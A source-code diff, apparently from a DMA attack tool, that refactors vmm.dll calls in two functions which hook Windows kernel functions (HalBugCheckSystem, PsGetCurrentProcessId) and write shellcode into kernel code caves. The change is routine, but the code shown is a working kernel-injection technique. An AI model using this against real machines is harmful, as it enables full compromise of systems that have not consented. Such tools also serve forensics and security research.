@@ -805,20 +805,20 @@ BOOL KMDOpen_WINX64_2_VMM()
     //    hal.dll!HalBugCheckSystem (used for 'hook' to provide valid landing
     //             site for PsCreateSystemThread -> no security bugchecks...)
     // ------------------------------------------------------------------------
-    vaBaseKdCom = VMMDLL_ProcessGetModuleBaseU(4, "kdcom.dll");
-    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBaseU(4, "ntoskrnl.exe");
-    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddressU(4, "hal.dll", "HalBugCheckSystem");
+    vaBaseKdCom = VMMDLL_ProcessGetModuleBaseU(ctxMain->hVMM, 4, "kdcom.dll");
+    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBaseU(ctxMain->hVMM, 4, "ntoskrnl.exe");
+    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "hal.dll", "HalBugCheckSystem");
     if(!vaBaseKdCom || !vaBaseNtoskrnl || !vaHalBugCheckSystem) {
         printf("KMD: Failed vmm.dll!ProcessGetModuleBase (kdcom.dll/ntoskrnl.exe)\n");
         goto fail;
     }
-    if(!VMMDLL_ProcessGetSectionsU(4, "kdcom.dll", NULL, 0, &cSections) || !cSections) {
+    if(!VMMDLL_ProcessGetSectionsU(ctxMain->hVMM, 4, "kdcom.dll", NULL, 0, &cSections) || !cSections) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #1\n");
         goto fail;
     }
     pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
     if(!pSections) { goto fail; }
-    if(!VMMDLL_ProcessGetSectionsU(4, "kdcom.dll", pSections, cSections, &cSections)) {
+    if(!VMMDLL_ProcessGetSectionsU(ctxMain->hVMM, 4, "kdcom.dll", pSections, cSections, &cSections)) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #2\n");
         goto fail;
     }
@@ -831,12 +831,12 @@ BOOL KMDOpen_WINX64_2_VMM()
         }
     }
     if(!vaExec || !vaData) { goto fail; }
-    VMMDLL_MemVirt2Phys(4, vaData, &paData);
-    VMMDLL_MemRead(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
+    VMMDLL_MemVirt2Phys(ctxMain->hVMM, 4, vaData, &paData);
+    VMMDLL_MemRead(ctxMain->hVMM, 4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
     // ------------------------------------------------------------------------
     // 3: Check if inject is already active!
     // ------------------------------------------------------------------------
-    if(VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE) && paKMD) {
+    if(VMMDLL_MemReadEx(ctxMain->hVMM, 4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE) && paKMD) {
         goto success_kmd_load;
     }
     // ------------------------------------------------------------------------
@@ -844,13 +844,7 @@ BOOL KMDOpen_WINX64_2_VMM()
     //    i.e. function table in hal.dll heap. Result is address of function pointer to
     //    place hook upon.
     // ------------------------------------------------------------------------
-    if(!VMMDLL_Map_GetPteU(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
-        printf("KMD: Failed vmm.dll!Map_GetPte #1.\n");
-        goto fail;
-    }
-    pMemMap = LocalAlloc(LMEM_ZEROINIT, cbMemMap);
-    if(!pMemMap) { goto fail; }
-    if(!VMMDLL_Map_GetPteU(4, pMemMap, &cbMemMap, FALSE)) {
+    if(!VMMDLL_Map_GetPteU(ctxMain->hVMM, 4, FALSE, &pMemMap)) {
         printf("KMD: Failed vmm.dll!Map_GetPte #2.\n");
         goto fail;
     }
@@ -863,7 +857,7 @@ BOOL KMDOpen_WINX64_2_VMM()
         if(pMemMap->pMap[i].vaBase < 0xfffff78000000000) { continue; }
         for(j = 0; j < pMemMap->pMap[i].cPages; j++) {
             vaHook = pMemMap->pMap[i].vaBase + (j << 12);
-            VMMDLL_MemReadPage(4, vaHook, pbPage);
+            VMMDLL_MemReadPage(ctxMain->hVMM, 4, vaHook, pbPage);
             if(KMD_Win_SearchTableHalpApicRequestInterrupt(pbPage, vaHook, &dwHookOffset)) {
                 vaHook += dwHookOffset;
                 goto success_locate_hook; // lvl2 loop breakout with goto
@@ -871,7 +865,7 @@ BOOL KMDOpen_WINX64_2_VMM()
         }
     }
 success_locate_hook:
-    if(!VMMDLL_MemRead(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD))) {
+    if(!VMMDLL_MemRead(ctxMain->hVMM, 4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD))) {
         printf("KMD: Failed vmm.dll!MemRead #1.\n");
         goto fail;
     }
@@ -884,39 +878,39 @@ success_locate_hook:
     *(PQWORD)(pbExec + 0x18) = vaData + 0x10;                   // DEBUG data address
     *(PQWORD)(pbExec + 0x20) = vaData;                          // KMDDATA physical address
     *(PQWORD)(pbExec + 0x28) = vaBaseNtoskrnl;                  // NTOSKRNL.EXE virtual address
-    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmAllocateContiguousMemory");
-    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsCreateSystemThread");
-    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmGetPhysicalAddress");
-    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "KeGetCurrentIrql");
+    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "MmAllocateContiguousMemory");
+    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "PsCreateSystemThread");
+    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "MmGetPhysicalAddress");
+    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "KeGetCurrentIrql");
     *(PQWORD)(pbExec + 0x50) = vaHalBugCheckSystem;
     // ------------------------------------------------------------------------
     // 6: hook and watch for execution & restore
     // ------------------------------------------------------------------------
     qwTMP = 0x0000000025ff9090;
-    VMMDLL_MemWrite(4, vaHalBugCheckSystem, (PBYTE)&qwTMP, 8);
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHalBugCheckSystem, (PBYTE)&qwTMP, 8);
     qwTMP = vaExec + 2;
-    VMMDLL_MemWrite(4, vaHalBugCheckSystem + 8, (PBYTE)&qwTMP, 8);
-    if(!VMMDLL_MemWrite(4, vaExec, pbExec, 0x800) || !VMMDLL_MemRead(4, vaExec, pbExecVerify, 0x800) || memcmp(pbExec, pbExecVerify, 0x800)) {
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHalBugCheckSystem + 8, (PBYTE)&qwTMP, 8);
+    if(!VMMDLL_MemWrite(ctxMain->hVMM, 4, vaExec, pbExec, 0x800) || !VMMDLL_MemRead(ctxMain->hVMM, 4, vaExec, pbExecVerify, 0x800) || memcmp(pbExec, pbExecVerify, 0x800)) {
         printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #2.\n");
         goto fail;
     }
-    if(!VMMDLL_MemWrite(4, vaHook, (PBYTE)&vaExec, sizeof(QWORD))) {
+    if(!VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHook, (PBYTE)&vaExec, sizeof(QWORD))) {
         printf("KMD: Failed vmm.dll!MemWrite (kdcom.dll) #3.\n");
         goto fail;
     }
     printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
     do {
         Sleep(100);
-        if(!VMMDLL_MemReadEx(4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
+        if(!VMMDLL_MemReadEx(ctxMain->hVMM, 4, vaData, (PBYTE)&paKMD, sizeof(QWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
     } while(paKMD == 0);
     printf("KMD: Execution received - continuing ...\n");
-    VMMDLL_MemWrite(4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD));
-    VMMDLL_MemWrite(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHook, (PBYTE)&qwHookOrig, sizeof(QWORD));
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
     ZeroMemory(pbPage, 0x1000);
-    VMMDLL_MemWrite(4, vaData, pbPage, 0x800);
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaData, pbPage, 0x800);
     //------------------------------------------------
     // 7: Set up reference to KMD.
     //------------------------------------------------
@@ -947,7 +941,7 @@ success_kmd_load:
     result = TRUE;
 fail:
     LocalFree(pSections);
-    LocalFree(pMemMap);
+    VMMDLL_MemFree(pMemMap);
     Vmmx_Close();
     return result;
 }
@@ -986,11 +980,11 @@ BOOL KMDOpen_WINX64_3_VMM()
     //    data: (CI.dll '.data' section)
     //    hook: (nt!PsGetCurrentProcessId)
     // ------------------------------------------------------------------------
-    f = (vaCI = VMMDLL_ProcessGetModuleBaseU(4, "CI.dll")) &&
-        VMMDLL_ProcessGetSectionsU(4, "CI.dll", NULL, 0, &cSections) &&
+    f = (vaCI = VMMDLL_ProcessGetModuleBaseU(ctxMain->hVMM, 4, "CI.dll")) &&
+        VMMDLL_ProcessGetSectionsU(ctxMain->hVMM, 4, "CI.dll", NULL, 0, &cSections) &&
         cSections &&
         (pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER))) &&
-        VMMDLL_ProcessGetSectionsU(4, "CI.dll", pSections, cSections, &cSections);
+        VMMDLL_ProcessGetSectionsU(ctxMain->hVMM, 4, "CI.dll", pSections, cSections, &cSections);
     for(i = 0; f && (i < cSections); i++) {
         if(!strcmp("INIT", pSections[i].Name)) {
             vaExec = vaCI + pSections[i].VirtualAddress + 0x400;
@@ -1003,8 +997,8 @@ BOOL KMDOpen_WINX64_3_VMM()
         printf("KMD: Failed get code cave (CI.dll) #2\n");
         goto fail;
     }
-    f = (vaHook = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsGetCurrentProcessId")) &&
-        VMMDLL_MemRead(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
+    f = (vaHook = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "PsGetCurrentProcessId")) &&
+        VMMDLL_MemRead(ctxMain->hVMM, 4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
     if(!f) {
         printf("KMD: Failed get hook (ntoskrnl.exe) #3\n");
         goto fail;
@@ -1016,19 +1010,19 @@ BOOL KMDOpen_WINX64_3_VMM()
     // ------------------------------------------------------------------------
     // 4: Prepare and Inject!
     // ------------------------------------------------------------------------
-    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "KeGetCurrentIrql")) &&
-        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsCreateSystemThread")) &&
-        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "ZwClose")) &&
-        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
-        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmGetPhysicalAddress")) &&
-        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBaseU(4, "ntoskrnl.exe"));
+    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "KeGetCurrentIrql")) &&
+        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "PsCreateSystemThread")) &&
+        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "ZwClose")) &&
+        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
+        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddressU(ctxMain->hVMM, 4, "ntoskrnl.exe", "MmGetPhysicalAddress")) &&
+        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBaseU(ctxMain->hVMM, 4, "ntoskrnl.exe"));
     if(!f) {
         printf("KMD: Failed get functions (ntoskrnl.exe) #5\n");
         goto fail;
     }
     *(PQWORD)(pbShellcode + 0x018) = vaDataPre;
     memcpy(pbShellcode + 0x004, pbHookOriginalData, sizeof(pbHookOriginalData));
-    if(!VMMDLL_MemWrite(4, vaExec, pbShellcode, cbShellcode) || !VMMDLL_MemRead(4, vaExec, pbShellcodeVerify, cbShellcode) || memcmp(pbShellcode, pbShellcodeVerify, cbShellcode)) {
+    if(!VMMDLL_MemWrite(ctxMain->hVMM, 4, vaExec, pbShellcode, cbShellcode) || !VMMDLL_MemRead(ctxMain->hVMM, 4, vaExec, pbShellcodeVerify, cbShellcode) || memcmp(pbShellcode, pbShellcodeVerify, cbShellcode)) {
         printf("KMD: Failed MemWrite (CI.dll) #6\n");
         goto fail;
     }
@@ -1045,7 +1039,7 @@ BOOL KMDOpen_WINX64_3_VMM()
         pbHook[0] = 0xE9;   // JMP
         *(PDWORD)(pbHook + 1) = (dwHookJMP = (DWORD)(vaExec - (vaHook + 5ULL)));
     }
-    if(!VMMDLL_MemWrite(4, vaHook, pbHook, sizeof(pbHook))) {
+    if(!VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHook, pbHook, sizeof(pbHook))) {
         printf("KMD: Failed MemWrite (ntoskrnl.exe) #7\n");
         goto fail;
     }
@@ -1055,7 +1049,7 @@ BOOL KMDOpen_WINX64_3_VMM()
     printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
     do {
         Sleep(100);
-        if(!VMMDLL_MemReadEx(4, vaDataPre + 0x1c, (PBYTE)&paKMD, sizeof(DWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
+        if(!VMMDLL_MemReadEx(ctxMain->hVMM, 4, vaDataPre + 0x1c, (PBYTE)&paKMD, sizeof(DWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail_hookrestore;
         }
@@ -1089,8 +1083,8 @@ BOOL KMDOpen_WINX64_3_VMM()
     }
     fResult = TRUE;
 fail_hookrestore:
-    VMMDLL_MemWrite(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
-    VMMDLL_MemWrite(4, vaDataPre, pbZero20, sizeof(pbZero20));
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
+    VMMDLL_MemWrite(ctxMain->hVMM, 4, vaDataPre, pbZero20, sizeof(pbZero20));
 fail:
     LocalFree(pSections);
     Vmmx_Close();
